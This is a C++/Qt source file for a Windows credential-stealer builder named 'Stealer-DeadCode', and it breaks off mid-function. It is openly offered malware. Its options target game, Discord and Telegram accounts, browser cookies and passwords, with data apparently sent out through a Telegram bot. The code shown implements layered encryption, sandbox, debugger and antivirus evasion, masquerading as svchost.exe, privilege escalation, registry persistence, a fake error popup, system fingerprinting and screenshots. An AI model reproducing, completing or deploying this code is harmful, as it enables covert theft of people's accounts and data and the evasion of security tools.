#include <winsock2.h>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <regex>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <psapi.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <wincrypt.h>
#include <urlmon.h>
#include <filesystem>
#include <random>
#include <time.h>
#include <zip.h>
#include <QApplication>
#include <QMainWindow>
#include <QThread>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QFile>
#include <QFileDialog>
#include <QMessageBox>
#include <mutex>
#include <thread>
#include <memoryapi.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "urlmon.lib")

#include "ui_mainwindow.h"

// Переопределение типов для совместимости
typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadQuerySetWin32StartAddress = 9
} THREADINFOCLASS;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    ULONG_PTR ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// Глобальные переменные с защитой потоков
std::mutex g_mutex;
std::string ENCRYPTION_KEY1, ENCRYPTION_KEY2, ENCRYPTION_SALT, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID;

// Класс главного окна
class MainWindow : public QMainWindow, private Ui::MainWindow {
    Q_OBJECT
public:
    explicit MainWindow(QWidget* parent = nullptr) : QMainWindow(parent) {
        setupUi(this);

        // Подключение кнопки "Обзор..." для выбора иконки
        connect(iconBrowseButton, &QPushButton::clicked, this, &MainWindow::onIconBrowseClicked);
        // Подключение кнопки "Собрать"
        connect(buildButton, &QPushButton::clicked, this, &MainWindow::onBuildClicked);
        // Подключение действий меню
        connect(actionSaveConfig, &QAction::triggered, this, &MainWindow::onSaveConfig);
        connect(actionLoadConfig, &QAction::triggered, this, &MainWindow::onLoadConfig);
        connect(actionExportLogs, &QAction::triggered, this, &MainWindow::onExportLogs);
        connect(actionExit, &QAction::triggered, this, &MainWindow::close);
        connect(actionAbout, &QAction::triggered, this, &MainWindow::onAbout);
    }

    void appendLog(const std::string& message) {
        textEdit->append(QString::fromStdString(message));
    }

private slots:
    void onIconBrowseClicked() {
        QString fileName = QFileDialog::getOpenFileName(this, tr("Выберите иконку"), "", tr("Icon Files (*.ico)"));
        if (!fileName.isEmpty()) {
            iconPathLineEdit->setText(fileName);
        }
    }

    void onBuildClicked() {
        // Получение настроек из интерфейса
        ENCRYPTION_KEY1 = encryptionKey1LineEdit->text().toStdString();
        ENCRYPTION_KEY2 = encryptionKey2LineEdit->text().toStdString();
        ENCRYPTION_SALT = encryptionSaltLineEdit->text().toStdString();
        TELEGRAM_BOT_TOKEN = tokenLineEdit->text().toStdString();
        TELEGRAM_CHAT_ID = chatIdLineEdit->text().toStdString();

        if (ENCRYPTION_KEY1.empty() || ENCRYPTION_KEY2.empty() || ENCRYPTION_SALT.empty()) {
            appendLog("Ошибка: ключи шифрования и соль должны быть заполнены");
            return;
        }
        if (sendMethodComboBox->currentText() == "Telegram" && (TELEGRAM_BOT_TOKEN.empty() || TELEGRAM_CHAT_ID.empty())) {
            appendLog("Ошибка: для Telegram необходимо указать токен и Chat ID");
            return;
        }

        appendLog("Сборка начата...");

        // Запуск сбора данных в отдельном потоке
        std::thread dataCollector([this]() {
            CollectData();
        });
        dataCollector.detach();
    }

    void onSaveConfig() {
        QString fileName = QFileDialog::getSaveFileName(this, tr("Сохранить конфигурацию"), "", tr("Config Files (*.cfg)"));
        if (!fileName.isEmpty()) {
            std::ofstream file(fileName.toStdString());
            if (file.is_open()) {
                file << "Token: " << tokenLineEdit->text().toStdString() << "\n";
                file << "ChatID: " << chatIdLineEdit->text().toStdString() << "\n";
                file << "FileName: " << fileNameLineEdit->text().toStdString() << "\n";
                file << "EncryptionKey1: " << encryptionKey1LineEdit->text().toStdString() << "\n";
                file << "EncryptionKey2: " << encryptionKey2LineEdit->text().toStdString() << "\n";
                file << "EncryptionSalt: " << encryptionSaltLineEdit->text().toStdString() << "\n";
                file << "IconPath: " << iconPathLineEdit->text().toStdString() << "\n";
                file << "SendMethod: " << sendMethodComboBox->currentText().toStdString() << "\n";
                file << "Modules:\n";
                file << "Steam: " << (steamCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "SteamMAFile: " << (steamMAFileCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "Epic: " << (epicCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "Roblox: " << (robloxCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "BattleNet: " << (battlenetCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "Minecraft: " << (minecraftCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "Discord: " << (discordCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "Telegram: " << (telegramCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "ChatHistory: " << (chatHistoryCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "Cookies: " << (cookiesCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "Passwords: " << (passwordsCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "Screenshot: " << (screenshotCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "FileGrabber: " << (fileGrabberCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "SystemInfo: " << (systemInfoCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "SocialEngineering: " << (socialEngineeringCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "AntiVM: " << (antiVMCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "FakeError: " << (fakeErrorCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "Silent: " << (silentCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "AutoStart: " << (autoStartCheckBox->isChecked() ? "1" : "0") << "\n";
                file << "Persist: " << (persistCheckBox->isChecked() ? "1" : "0") << "\n";
                file.close();
                appendLog("Конфигурация сохранена в: " + fileName.toStdString());
            } else {
                appendLog("Ошибка: не удалось сохранить конфигурацию");
            }
        }
    }

    void onLoadConfig() {
        QString fileName = QFileDialog::getOpenFileName(this, tr("Загрузить конфигурацию"), "", tr("Config Files (*.cfg)"));
        if (!fileName.isEmpty()) {
            std::ifstream file(fileName.toStdString());
            if (file.is_open()) {
                std::string line;
                while (std::getline(file, line)) {
                    if (line.find("Token: ") == 0) tokenLineEdit->setText(QString::fromStdString(line.substr(7)));
                    else if (line.find("ChatID: ") == 0) chatIdLineEdit->setText(QString::fromStdString(line.substr(8)));
                    else if (line.find("FileName: ") == 0) fileNameLineEdit->setText(QString::fromStdString(line.substr(10)));
                    else if (line.find("EncryptionKey1: ") == 0) encryptionKey1LineEdit->setText(QString::fromStdString(line.substr(16)));
                    else if (line.find("EncryptionKey2: ") == 0) encryptionKey2LineEdit->setText(QString::fromStdString(line.substr(16)));
                    else if (line.find("EncryptionSalt: ") == 0) encryptionSaltLineEdit->setText(QString::fromStdString(line.substr(16)));
                    else if (line.find("IconPath: ") == 0) iconPathLineEdit->setText(QString::fromStdString(line.substr(10)));
                    else if (line.find("SendMethod: ") == 0) sendMethodComboBox->setCurrentText(QString::fromStdString(line.substr(12)));
                    else if (line.find("Steam: ") == 0) steamCheckBox->setChecked(line.substr(7) == "1");
                    else if (line.find("SteamMAFile: ") == 0) steamMAFileCheckBox->setChecked(line.substr(13) == "1");
                    else if (line.find("Epic: ") == 0) epicCheckBox->setChecked(line.substr(6) == "1");
                    else if (line.find("Roblox: ") == 0) robloxCheckBox->setChecked(line.substr(8) == "1");
                    else if (line.find("BattleNet: ") == 0) battlenetCheckBox->setChecked(line.substr(11) == "1");
                    else if (line.find("Minecraft: ") == 0) minecraftCheckBox->setChecked(line.substr(11) == "1");
                    else if (line.find("Discord: ") == 0) discordCheckBox->setChecked(line.substr(9) == "1");
                    else if (line.find("Telegram: ") == 0) telegramCheckBox->setChecked(line.substr(10) == "1");
                    else if (line.find("ChatHistory: ") == 0) chatHistoryCheckBox->setChecked(line.substr(13) == "1");
                    else if (line.find("Cookies: ") == 0) cookiesCheckBox->setChecked(line.substr(9) == "1");
                    else if (line.find("Passwords: ") == 0) passwordsCheckBox->setChecked(line.substr(11) == "1");
                    else if (line.find("Screenshot: ") == 0) screenshotCheckBox->setChecked(line.substr(12) == "1");
                    else if (line.find("FileGrabber: ") == 0) fileGrabberCheckBox->setChecked(line.substr(13) == "1");
                    else if (line.find("SystemInfo: ") == 0) systemInfoCheckBox->setChecked(line.substr(12) == "1");
                    else if (line.find("SocialEngineering: ") == 0) socialEngineeringCheckBox->setChecked(line.substr(19) == "1");
                    else if (line.find("AntiVM: ") == 0) antiVMCheckBox->setChecked(line.substr(8) == "1");
                    else if (line.find("FakeError: ") == 0) fakeErrorCheckBox->setChecked(line.substr(11) == "1");
                    else if (line.find("Silent: ") == 0) silentCheckBox->setChecked(line.substr(8) == "1");
                    else if (line.find("AutoStart: ") == 0) autoStartCheckBox->setChecked(line.substr(11) == "1");
                    else if (line.find("Persist: ") == 0) persistCheckBox->setChecked(line.substr(9) == "1");
                }
                file.close();
                appendLog("Конфигурация загружена из: " + fileName.toStdString());
            } else {
                appendLog("Ошибка: не удалось загрузить конфигурацию");
            }
        }
    }

    void onExportLogs() {
        QString fileName = QFileDialog::getSaveFileName(this, tr("Экспорт логов"), "", tr("Text Files (*.txt)"));
        if (!fileName.isEmpty()) {
            std::ofstream file(fileName.toStdString());
            if (file.is_open()) {
                file << textEdit->toPlainText().toStdString();
                file.close();
                appendLog("Логи экспортированы в: " + fileName.toStdString());
            } else {
                appendLog("Ошибка: не удалось экспортировать логи");
            }
        }
    }

    void onAbout() {
        QMessageBox::about(this, tr("О программе"), tr("Stealer-DeadCode\nВерсия: 1.0\nРазработчик: Anonymous\nОписание: Многофункциональный инструмент для сбора данных."));
    }
};

// Генерация случайного ключа
std::string GenerateRandomKey(size_t length) {
    std::string key;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(33, 126);
    for (size_t i = 0; i < length; i++) {
        key += static_cast<char>(dis(gen));
    }
    return key;
}

// RC4 шифрование
void RC4(std::string& data, const std::string& key) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key.length()]) % 256;
        std::swap(S[i], S[j]);
    }
    int i = 0, k = 0;
    for (size_t n = 0; n < data.length(); n++) {
        i = (i + 1) % 256;
        k = (k + S[i]) % 256;
        std::swap(S[i], S[k]);
        data[n] ^= S[(S[i] + S[k]) % 256];
    }
}

// AES шифрование
std::string AESEncrypt(const std::string& data, const std::string& key) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    std::string encryptedData;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to open AES algorithm provider");
        return data;
    }

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to set AES chaining mode");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return data;
    }

    DWORD keyObjectLen = 0, dataSize = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectLen, sizeof(DWORD), &dataSize, 0);
    std::vector<BYTE> keyObject(keyObjectLen);

    std::string paddedKey = key;
    if (paddedKey.size() < 32) paddedKey.resize(32, 0);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), keyObjectLen, (PBYTE)paddedKey.c_str(), 32, 0))) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to generate AES key");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return data;
    }

    std::vector<BYTE> iv(16);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (int i = 0; i < 16; i++) iv[i] = dis(gen);

    DWORD cbEncrypted = 0;
    BCryptEncrypt(hKey, (PBYTE)data.c_str(), data.size(), nullptr, iv.data(), iv.size(), nullptr, 0, &cbEncrypted, BCRYPT_BLOCK_PADDING);

    std::vector<BYTE> encrypted(cbEncrypted);
    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PBYTE)data.c_str(), data.size(), nullptr, iv.data(), iv.size(), encrypted.data(), cbEncrypted, &dataSize, BCRYPT_BLOCK_PADDING))) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to perform AES encryption");
    } else {
        encryptedData = std::string((char*)iv.data(), 16) + std::string((char*)encrypted.data(), dataSize);
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return encryptedData;
}

// AES дешифрование
std::string AESDecrypt(const std::string& data, const std::string& key) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    std::string decryptedData;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to open AES algorithm provider");
        return data;
    }

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to set AES chaining mode");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return data;
    }

    DWORD keyObjectLen = 0, dataSize = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectLen, sizeof(DWORD), &dataSize, 0);
    std::vector<BYTE> keyObject(keyObjectLen);

    std::string paddedKey = key;
    if (paddedKey.size() < 32) paddedKey.resize(32, 0);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), keyObjectLen, (PBYTE)paddedKey.c_str(), 32, 0))) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to generate AES key");
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return data;
    }

    std::vector<BYTE> iv(data.begin(), data.begin() + 16);
    std::string encryptedData = data.substr(16);

    DWORD cbDecrypted = 0;
    BCryptDecrypt(hKey, (PBYTE)encryptedData.c_str(), encryptedData.size(), nullptr, iv.data(), iv.size(), nullptr, 0, &cbDecrypted, BCRYPT_BLOCK_PADDING);

    std::vector<BYTE> decrypted(cbDecrypted);
    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PBYTE)encryptedData.c_str(), encryptedData.size(), nullptr, iv.data(), iv.size(), decrypted.data(), cbDecrypted, &dataSize, BCRYPT_BLOCK_PADDING))) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to perform AES decryption");
    } else {
        decryptedData = std::string((char*)decrypted.data(), dataSize);
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return decryptedData;
}

// Многослойное XOR шифрование
std::string MultiLayerXOR(std::string data) {
    std::string key1 = ENCRYPTION_KEY1;
    std::string key2 = ENCRYPTION_KEY2;
    std::string salt = ENCRYPTION_SALT;

    std::string result = data;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);

    for (size_t i = 0; i < result.size(); i++) {
        result[i] ^= key1[i % key1.size()] ^ dis(gen);
    }
    for (size_t i = 0; i < result.size(); i++) {
        result[i] ^= key2[i % key2.size()] ^ dis(gen);
    }
    std::string salted = salt + result + salt;
    RC4(salted, key1);
    return AESEncrypt(salted, key1 + key2);
}

// Дешифрование данных
std::string SelfDecrypt(std::string data) {
    std::string result = data;
    std::string decryptedAES = AESDecrypt(data, ENCRYPTION_KEY1 + ENCRYPTION_KEY2);
    RC4(decryptedAES, ENCRYPTION_KEY1);
    result = decryptedAES.substr(ENCRYPTION_SALT.size(), decryptedAES.size() - 2 * ENCRYPTION_SALT.size());
    for (size_t i = 0; i < result.size(); i++) {
        result[i] ^= ENCRYPTION_KEY2[i % ENCRYPTION_KEY2.size()];
    }
    for (size_t i = 0; i < result.size(); i++) {
        result[i] ^= ENCRYPTION_KEY1[i % ENCRYPTION_KEY1.size()];
    }
    return result;
}

// Проверка на виртуальную машину
bool CheckVirtualEnvironment() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256];
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "Identifier", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            std::string identifier(value);
            if (identifier.find("VBOX") != std::string::npos || identifier.find("VMWARE") != std::string::npos ||
                identifier.find("QEMU") != std::string::npos || identifier.find("VIRTUAL") != std::string::npos) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
    if (GetModuleHandleA("SbieDll.dll") || GetModuleHandleA("dbghelp.dll")) return true;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 2) return true;
    MEMORYSTATUSEX memStatus = { sizeof(memStatus) };
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 100000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 50) return true;
    return false;
}

// Проверка на отладчик или антивирус
bool CheckDebuggerOrAntivirus() {
    if (IsDebuggerPresent()) return true;
    typedef NTSTATUS(NTAPI *pNtQueryInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG);
    pNtQueryInformationThread NtQueryInformationThread = reinterpret_cast<pNtQueryInformationThread>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"));
    if (NtQueryInformationThread) {
        THREAD_BASIC_INFORMATION tbi;
        NtQueryInformationThread(GetCurrentThread(), ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);
        if (tbi.TebBaseAddress) {
            DWORD debugPort = 0;
            NtQueryInformationThread(GetCurrentThread(), ThreadQuerySetWin32StartAddress, &debugPort, sizeof(debugPort), nullptr);
            if (debugPort != 0) return true;
        }
    }
    const char* avProcesses[] = {
        "avp.exe", "MsMpEng.exe", "avgui.exe", "egui.exe", "McTray.exe",
        "norton.exe", "avastui.exe", "kav.exe", "wireshark.exe", "ollydbg.exe", nullptr
    };
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    bool avDetected = false;
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            for (int i = 0; avProcesses[i]; i++) {
                std::wstring wAvProcess(avProcesses[i], avProcesses[i] + strlen(avProcesses[i]));
                if (_wcsicmp(pe32.szExeFile, wAvProcess.c_str()) == 0) {
                    avDetected = true;
                    break;
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32) && !avDetected);
    }
    CloseHandle(hProcessSnap);
    return avDetected;
}

// Антианализ
bool AntiAnalysis() {
    if (g_mainWindow->antiVMCheckBox->isChecked() && CheckVirtualEnvironment()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Virtual machine detected, exiting");
        return true;
    }
    if (CheckDebuggerOrAntivirus()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Debugger or Antivirus detected, exiting");
        return true;
    }
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 1000000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 100) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Suspicious execution time detected, exiting");
        return true;
    }
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te32 = { sizeof(te32) };
        int threadCount = 0;
        if (Thread32First(hThreadSnap, &te32)) {
            do {
                if (te32.th32OwnerProcessID == GetCurrentProcessId()) threadCount++;
            } while (Thread32Next(hThreadSnap, &te32));
        }
        CloseHandle(hThreadSnap);
        if (threadCount > 50) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Too many threads detected, exiting");
            return true;
        }
    }
    char processName[MAX_PATH];
    GetModuleFileNameA(nullptr, processName, MAX_PATH);
    std::string procName = std::filesystem::path(processName).filename().string();
    if (procName.find("analyzer") != std::string::npos || procName.find("sandbox") != std::string::npos) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Suspicious process name detected, exiting");
        return true;
    }
    return false;
}

// Маскировка процесса
void MaskProcess() {
    HANDLE hProcess = GetCurrentProcess();
    SetPriorityClass(hProcess, HIGH_PRIORITY_CLASS);
    wchar_t systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    wcscat_s(systemPath, L"\\svchost.exe");
    SetFileAttributesW(systemPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

    typedef NTSTATUS(NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG);
    pNtSetInformationProcess NtSetInformationProcess = reinterpret_cast<pNtSetInformationProcess>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess"));
    if (NtSetInformationProcess) {
        wchar_t fakeName[] = L"svchost.exe";
        NtSetInformationProcess(hProcess, 0x1C, fakeName, sizeof(fakeName));
    }
}

// Повышение привилегий и скрытие
void Stealth() {
    if (!g_mainWindow->silentCheckBox->isChecked()) {
        SetFileAttributesA(GetCommandLineA(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        MaskProcess();
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
            TOKEN_PRIVILEGES tp = { 1 };
            LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
            CloseHandle(hToken);
        }
    }
}

// Добавление в автозапуск
void AddToStartup() {
    if (g_mainWindow->autoStartCheckBox->isChecked()) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            char path[MAX_PATH];
            GetModuleFileNameA(nullptr, path, MAX_PATH);
            RegSetValueExA(hKey, "svchost", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
            RegCloseKey(hKey);
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Added to startup (HKEY_CURRENT_USER)");
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to add to startup (HKEY_CURRENT_USER)");
        }
    }
}

// Обеспечение персистентности
void Persist() {
    if (g_mainWindow->persistCheckBox->isChecked()) {
        AddToStartup();
        HKEY hKey;
        if (RegCreateKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
            char path[MAX_PATH];
            GetModuleFileNameA(nullptr, path, MAX_PATH);
            RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
            RegCloseKey(hKey);
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Persisted in HKEY_LOCAL_MACHINE");
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to persist (HKEY_LOCAL_MACHINE)");
        }
    }
}

// Отображение фейковой ошибки
void FakeError() {
    if (g_mainWindow->fakeErrorCheckBox->isChecked()) {
        MessageBoxA(nullptr, "System Error: svchost.exe has stopped working.", "System Error", MB_ICONERROR);
    }
}

// Получение системной информации
std::string GetCustomSystemInfo() {
    if (!g_mainWindow->systemInfoCheckBox->isChecked()) return "";
    std::string result;
    char username[256];
    DWORD usernameLen = sizeof(username);
    if (GetUserNameA(username, &usernameLen)) {
        result += "Username: " + std::string(username) + "\n";
    } else {
        result += "Username: Unknown\n";
    }
    char computerName[256];
    DWORD computerNameLen = sizeof(computerName);
    if (GetComputerNameA(computerName, &computerNameLen)) {
        result += "Computer Name: " + std::string(computerName) + "\n";
    } else {
        result += "Computer Name: Unknown\n";
    }
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    result += "Processor Architecture: " + std::to_string(sysInfo.wProcessorArchitecture) + "\n";
    result += "Number of Processors: " + std::to_string(sysInfo.dwNumberOfProcessors) + "\n";
    MEMORYSTATUSEX memInfo = { sizeof(memInfo) };
    if (GlobalMemoryStatusEx(&memInfo)) {
        result += "Total Physical Memory: " + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\n";
        result += "Available Physical Memory: " + std::to_string(memInfo.ullAvailPhys / (1024 * 1024)) + " MB\n";
    }
    OSVERSIONINFOA osInfo = { sizeof(osInfo) };
#pragma warning(suppress: 4996)
    if (GetVersionExA(&osInfo)) {
        result += "OS Version: " + std::to_string(osInfo.dwMajorVersion) + "." + std::to_string(osInfo.dwMinorVersion) + "\n";
        result += "Build Number: " + std::to_string(osInfo.dwBuildNumber) + "\n";
    }
    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            result += "Adapter Name: " + std::string(adapter->AdapterName) + "\n";
            result += "Description: " + std::string(adapter->Description) + "\n";
            result += "MAC Address: ";
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char mac[3];
                sprintf_s(mac, "%02X", adapter->Address[i]);
                result += mac;
                if (i < adapter->AddressLength - 1) result += "-";
            }
            result += "\nIP Address: " + std::string(adapter->IpAddressList.IpAddress.String) + "\n";
        }
    }
    return result;
}

// Создание скриншота
std::string TakeScreenshot() {
    if (!g_mainWindow->screenshotCheckBox->isChecked()) return "";
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr) != Gdiplus::Ok) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to initialize Gdiplus");
        return "";
    }
    HDC hScreenDC = GetDC(nullptr);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsid;
    HRESULT hr = CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &clsid); // JPEG
    std::string screenshotName = "screenshot_" + std::to_string(GetTickCount()) + ".jpg";
    std::wstring screenshotNameW(screenshotName.begin(), screenshotName.end());
    hr = bitmap.Save(screenshotNameW.c_str(), &clsid, nullptr);
    if (FAILED(hr)) screenshotName.clear();
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
    DeleteObject(hBitmap);
    Gdiplus::GdiplusShutdown(gdiplusToken);
    if (screenshotName.empty()) {
